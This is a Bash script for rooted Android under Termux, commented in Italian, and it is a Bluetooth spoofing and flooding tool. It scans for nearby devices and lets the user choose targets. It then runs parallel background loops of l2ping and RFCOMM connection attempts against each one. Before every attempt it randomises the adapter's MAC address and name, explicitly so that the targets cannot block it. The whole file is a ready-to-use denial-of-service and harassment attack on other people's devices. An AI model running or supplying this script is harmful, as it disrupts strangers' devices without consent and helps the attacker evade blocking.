#!/data/data/com.termux/files/usr/bin/bash

# Questo script è progettato esclusivamente per Termux su Android.
# Richiede i permessi di root (comando 'su') per operare sull'hardware Bluetooth.

# --- Colori per l'output ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # Nessun colore

# --- Funzioni di Utility ---

# Funzione per stampare testo colorato
print_colored() {
    local text="$1"
    local color="$2"
    echo -e "${color}${text}${NC}"
}

# Funzione per verificare se un comando esiste
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Funzione per installare pacchetti mancanti (Termux specifico)
install_pkg() {
    local pkg_name="$1"
    print_colored "[*] Il comando '$pkg_name' non è stato trovato. Tentativo di installazione tramite pkg..." "${YELLOW}"
    if pkg install -y "$pkg_name"; then
        print_colored "[+] '$pkg_name' installato con successo." "${GREEN}"
        return 0
    else
        print_colored "[!] Errore durante l'installazione di '$pkg_name'. Assicurati che i repository siano aggiornati ('pkg update && pkg upgrade') e riprova." "${RED}"
        exit 1
    fi
}

# --- Controlli Preliminari ---

preliminary_checks() {
    print_colored "[*] Avvio dello script di spoofing e flood Bluetooth per Termux." "${YELLOW}"

    # Verifica root (essenziale per operazioni Bluetooth a basso livello)
    if [[ "$(id -u)" -ne 0 ]]; then
        print_colored "[!] Devi eseguire questo script come root. In Termux, usa 'su' prima di eseguire lo script." "${RED}"
        exit 1
    fi

    # Verifica e installa le dipendenze necessarie per Bluetooth
    print_colored "[*] Controllo delle dipendenze Bluetooth..." "${YELLOW}"
    local required_bt_cmds=("hciconfig" "bdaddr" "hcitool" "l2ping" "rfcomm")
    local bluez_installed=false

    for cmd in "${required_bt_cmds[@]}"; do
        if ! command_exists "$cmd"; then
            if [ "$bluez_installed" = false ]; then
                install_pkg "bluez" || exit 1 # Se l'installazione fallisce, esci
                bluez_installed=true
            fi
            # Controlla di nuovo dopo l'installazione, se ancora non esiste, c'è un problema
            if ! command_exists "$cmd"; then
                print_colored "[!] Impossibile trovare il comando '$cmd' anche dopo aver tentato l'installazione di 'bluez'. Potrebbe esserci un problema con l'installazione o il tuo ambiente." "${RED}"
                exit 1
            fi
        fi
    done
    
    # Verifica e installa 'timeout' (da coreutils)
    if ! command_exists "timeout"; then
        install_pkg "coreutils" || exit 1
    fi
}

# --- Funzioni Principali ---

# Funzione: spoof MAC + nome
spoof_identity() {
    # Genera un MAC address casuale con il prefisso locale amministrativo (02)
    # hexdump è un comando POSIX e funziona bene anche in Termux
    local rand_mac="02:$(hexdump -n3 -e '/1 ":%02X"' /dev/urandom)"
    # Genera un nome casuale (6 caratteri alfanumerici)
    local rand_name="BT_$(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 6 | head -n1)"
    
    print_colored "[*] Tentativo di spoofing identità..." "${YELLOW}"
    
    # Esegue i comandi e controlla il loro successo
    if ! hciconfig hci0 down &>/dev/null; then
        print_colored "[!] Errore: Impossibile spegnere hci0. Controlla il tuo adattatore Bluetooth." "${RED}"
        return 1
    fi
    if ! bdaddr -i hci0 "$rand_mac" &>/dev/null; then
        print_colored "[!] Errore: Impossibile cambiare MAC address di hci0." "${RED}"
        return 1
    fi
    if ! hciconfig hci0 name "$rand_name" &>/dev/null; then
        print_colored "[!] Errore: Impossibile cambiare il nome di hci0." "${RED}"
        return 1
    fi
    if ! hciconfig hci0 up &>/dev/null; then
        print_colored "[!] Errore: Impossibile accendere hci0." "${RED}"
        return 1
    fi
    
    print_colored "[+] Identità spoofata con successo: ${rand_name} - ${rand_mac}" "${GREEN}"
    return 0
}

# Funzione: scan dispositivi Bluetooth
scan_devices() {
    print_colored "[*] Scansione dispositivi Bluetooth nelle vicinanze (10 secondi)..." "${YELLOW}"
    
    # Esegue hcitool scan e salva l'output in un file temporaneo
    timeout 10s hcitool scan > /tmp/bluetooth_scan_results.txt 2>&1
    local scan_status=$?

    if [[ ! -s /tmp/bluetooth_scan_results.txt ]]; then
        print_colored "[!] Nessun dispositivo trovato o errore durante la scansione. Assicurati che il Bluetooth sia attivo." "${RED}"
        rm -f /tmp/bluetooth_scan_results.txt
        return 1
    fi

    devices=() # Array globale per i dispositivi
    # Legge il file temporaneo, saltando la prima riga di intestazione
    while IFS= read -r line; do
        line=$(echo "$line" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//') # Trim spazi bianchi
        if [[ -n "$line" && "$line" != *"Scanning"* ]]; then # Ignora righe vuote e la riga "Scanning..."
            local mac=$(echo "$line" | awk '{print $1}')
            local name=$(echo "$line" | cut -d ' ' -f 2-)
            
            if [[ -n "$mac" ]]; then # Assicurati che ci sia almeno un MAC
                # Se il nome è vuoto, usa un placeholder
                name="${name:-[NOME SCONOSCIUTO]}"
                devices+=("$mac|$name")
            fi
        fi
    done < <(tail -n +2 /tmp/bluetooth_scan_results.txt)
    
    rm -f /tmp/bluetooth_scan_results.txt # Pulisci il file temporaneo

    if [[ ${#devices[@]} -eq 0 ]]; then
        print_colored "[!] Nessun dispositivo Bluetooth valido trovato durante la scansione. Riprova o assicurati che i dispositivi siano visibili." "${RED}"
        return 1
    fi

    print_colored "--- Dispositivi Trovati ---" "${YELLOW}"
    for i in "${!devices[@]}"; do
        IFS="|" read -r mac name <<< "${devices[$i]}"
        print_colored "[$i] ${name} - ${mac}" "${NC}"
    done
    print_colored "---------------------------" "${YELLOW}"
    return 0
}

# Funzione: flood verso un singolo target
# Questo sarà eseguito in background per ogni target
flood_loop() {
    local target_mac="$1"
    local target_name="$2"
    local duration_seconds="$3"
    local end_time=$(( SECONDS + duration_seconds ))

    print_colored "[*] Avvio del flood su ${target_name} (${target_mac}) per ${duration_seconds} secondi..." "${YELLOW}"

    while [ "$SECONDS" -lt "$end_time" ]; do
        # Spoofa l'identità ad ogni ciclo per rendere più difficile il blocco
        # I messaggi di errore dello spoofing sono soppressi per non intasare l'output del flood
        spoof_identity &>/dev/null || print_colored "[!] Errore temporaneo durante lo spoofing dell'identità. Continuo con l'ultimo MAC/Nome valido." "${RED}"

        # Tenta un L2PING
        if l2ping -c 1 "$target_mac" &>/dev/null; then
            print_colored "[L2PING] Riuscito verso ${target_name} (${target_mac})" "${GREEN}"
        else
            print_colored "[L2PING] Fallito verso ${target_name} (${target_mac})" "${RED}"
        fi

        # Tenta una connessione RFCOMM con timeout
        if timeout 2s rfcomm connect hci0 "$target_mac" 1 &>/dev/null; then
            print_colored "[RFCOMM] Connessione tentata e riuscita verso ${target_name} (${target_mac})" "${GREEN}"
        else
            print_colored "[RFCOMM] Connessione RFCOMM fallita verso ${target_name} (${target_mac})" "${RED}"
        fi
        
        sleep 0.5 # Ritardo per evitare di sovraccaricare il sistema
    done
    print_colored "[*] Flood terminato per ${target_name} (${target_mac})." "${GREEN}"
}

# --- MAIN SCRIPT EXECUTION ---

# Esegui i controlli preliminari
preliminary_checks

# Esegui la scansione dei dispositivi
if ! scan_devices; then
    print_colored "[!] Impossibile procedere senza dispositivi Bluetooth rilevati. Esco." "${RED}"
    exit 1
fi

# Richiedi all'utente di selezionare i target
read -p "$(print_colored "Inserisci gli index separati da spazio dei target (es: 0 2 3): " "${YELLOW}")" -a selected_indices

# Verifica che gli index selezionati siano validi
valid_selection=true
for index in "${selected_indices[@]}"; do
    if ! [[ "$index" =~ ^[0-9]+$ ]] || [[ "$index" -ge ${#devices[@]} ]]; then
        print_colored "[!] Index non valido: $index. Seleziona solo numeri validi dalla lista." "${RED}"
        valid_selection=false
        break
    fi
done

if ! "$valid_selection"; then
    exit 1
fi

# Richiedi il comando di flood e la durata
read -p "$(print_colored "Digita il comando /flood <countdown_in_secondi> (es: /flood 60): " "${YELLOW}")" cmd_input

# Parsing del comando di flood usando regex di Bash
if [[ "$cmd_input" =~ ^/flood[[:space:]]+([0-9]+)$ ]]; then
    duration="${BASH_REMATCH[1]}"
    if [[ "$duration" -le 0 ]]; then
        print_colored "[!] La durata del flood deve essere un numero positivo." "${RED}"
        exit 1
    fi
else
    print_colored "[!] Comando non valido. Usa il formato: /flood <secondi> (es: /flood 60)" "${RED}"
    exit 1
fi

# Avvio flood per ogni target selezionato in background
print_colored "[*] Avvio dei processi di flood in background..." "${YELLOW}"
for i in "${selected_indices[@]}"; do
    IFS="|" read -r mac name <<< "${devices[$i]}"
    print_colored "[*] Avvio del flood in background per: ${name} (${mac})." "${YELLOW}"
    # Avvia flood_loop in un sub-shell in background per parallelismo
    ( flood_loop "$mac" "$name" "$duration" ) &
done

# Attendi che tutti i processi di flood in background terminino
print_colored "[*] Tutti i processi di flood sono stati avviati. Attendere il completamento di ciascuno..." "${YELLOW}"
wait # Questo comando attende che tutti i processi figli avviati in background con '&' terminino.
print_colored "[*] Flood terminato per tutti i target selezionati." "${GREEN}"
print_colored "[*] Script completato." "${GREEN}"
